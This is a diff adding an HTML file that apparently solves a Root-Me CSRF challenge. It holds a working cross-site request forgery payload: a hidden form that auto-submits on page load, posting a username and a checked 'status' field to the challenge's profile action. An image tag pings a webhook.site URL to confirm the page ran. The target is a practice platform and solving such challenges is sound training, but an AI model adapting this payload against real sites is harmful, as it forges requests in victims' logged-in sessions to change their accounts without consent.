@@ -1,0 +1,16 @@
+<html>
+  <body>
+    <!-- Ping pour confirmer exécution (optionnel) -->
+    <img src="https://webhook.site/b626f651-8da4-4515-ba3a-e24ba1f1d3ad?csrf_started" />
+
+    <div>
+      <form name="csrf_form" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST">
+        <input type="text" name="username" value="test">
+        <input type="checkbox" name="status" checked>
+      </form>
+      <script>
+        document.csrf_form.submit();
+      </script>
+    </div>
+  </body>
+</html>
